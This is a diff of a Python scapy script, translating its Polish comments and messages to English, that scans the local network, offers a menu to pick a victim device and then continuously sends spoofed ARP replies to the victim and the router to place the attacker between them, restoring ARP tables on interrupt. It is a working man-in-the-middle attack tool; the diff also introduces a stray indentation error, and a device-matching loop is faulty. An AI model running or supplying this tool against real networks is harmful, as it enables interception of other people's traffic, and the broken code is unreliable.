@@ -2,73 +2,70 @@ import scapy.all as scapy
 import psutil
 import ipaddress
 
+
 def get_local_network():
-    """Automatycznie pobiera zakres sieci lokalnej na podstawie aktywnego interfejsu"""
+    """Automatically retrieves the local network range based on the active interface"""
     interfaces = psutil.net_if_addrs()
     for iface_name, iface_info in interfaces.items():
         for addr in iface_info:
             if addr.family == 2:  # IPv4
                 ip = addr.address
                 netmask = addr.netmask
-                if ip != "127.0.0.1":  # Pomijamy localhost
+                if ip != "127.0.0.1":  # Skip localhost
                     network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                     return str(network)
-    raise ValueError("Nie znaleziono aktywnego interfejsu sieciowego")
-
+    raise ValueError("No active network interface found")
 
 def scan(ip_range):
-    """Skanuje sieć w podanym zakresie IP i zwraca listę urządzeń"""
-    print(f"[INFO] Skanowanie sieci: {ip_range}")
+    """Scans the network in the given IP range and returns a list of devices"""
+    print(f"[INFO] Scanning network: {ip_range}")
     request = scapy.ARP(pdst=ip_range)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     packet = broadcast / request
-    answered = scapy.srp(packet, timeout=2, verbose=False)[0]
+    answered = scapy.srp(packet, timeout=5, verbose=False)[0]
 
     devices = []
     for element in answered:
         devices.append({"ip": element[1].psrc, "mac": element[1].hwsrc})
     return devices
 
-
 def restore_defaults(dest, source):
-    """Przywraca domyślne ustawienia ARP"""
+    """Restores default ARP settings"""
     target_mac = get_mac(dest)
     source_mac = get_mac(source)
     packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
     scapy.send(packet, verbose=False)
 
-
 def get_mac(ip):
-    """Zwraca adres MAC dla danego IP"""
+    """Returns the MAC address for a given IP"""
     request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     packet = broadcast / request
     answer = scapy.srp(packet, timeout=2, verbose=False)[0]
     return answer[0][1].hwsrc
 
-
 def spoofing(target, spoofed):
-    """Wysyła spoofowany pakiet ARP"""
+    """Sends a spoofed ARP packet"""
     mac = get_mac(target)
     packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
     scapy.send(packet, verbose=False)
 
-
 def display_menu(devices):
-    """Wyświetla menu z listą urządzeń i pozwala wybrać cel"""
-    print("\nDostępne urządzenia w sieci:")
+    """Displays a menu with a list of devices and allows the user to select a target"""
+    print("\nAvailable devices on the network:")
     for i, device in enumerate(devices):
         print(f"{i + 1}. IP: {device['ip']}, MAC: {device['mac']}")
-    print("0. Wyjdź")
+    print("0. Exit")
 
-    choice = int(input("\nWybierz urządzenie (numer): "))
+    choice = int(input("\nSelect a device (number): "))
     if choice == 0:
         return
     elif 1 <= choice <= len(devices):
         return devices[choice - 1]
     else:
-        print("Nieprawidłowy wybór. Spróbuj ponownie.")
+        print("Invalid choice. Please try again.")
         return display_menu(devices)
+
 
 
 def start_arp_poisoning(mac_address):
@@ -79,11 +76,11 @@ def start_arp_poisoning(mac_address):
         devices = scan(network_range)
 
         if not devices:
-            print("Nie znaleziono urządzeń w sieci.")
-            return
+            print("No devices found on the network.")
+            exit(0)
 
-        # Wyświetlenie menu i wybór urządzenia
-        if mac_address is None:
+        # Display menu and select a target device
+         if mac_address is None:
             target_device = display_menu(devices)
         else:
             for device in enumerate(devices):
@@ -92,24 +89,22 @@ def start_arp_poisoning(mac_address):
 
         if target_device is None:
             return
-        # Podaj IP routera (bramy domyślnej)
-        router_ip = input("Podaj IP routera: ")
 
-        print(f"Rozpoczynam spoofing: {target_device['ip']} <- {router_ip}")
+        # Enter the router's IP (default gateway)
+        router_ip = input("Enter the router's IP: ")
+
+        print(f"Starting spoofing: {target_device['ip']} <- {router_ip}")
         try:
             while True:
                 spoofing(target_device["ip"], router_ip)
                 spoofing(router_ip, target_device["ip"])
         except KeyboardInterrupt:
-            print("\n[!] Proces przerwany. Przywracanie domyślnych ustawień ARP...")
+            print("\n[!] Process interrupted. Restoring default ARP settings...")
             restore_defaults(target_device["ip"], router_ip)
             restore_defaults(router_ip, target_device["ip"])
-            print("Przywrócono domyślne ustawienia. Zakończono.")
+            print("Default settings restored. Exiting.")
     except Exception as e:
         print(f"[ERROR] {e}")
-
-def start_arp_poisoning_loop():
-    pass
 
 if __name__ == "__main__":
     start_arp_poisoning("")
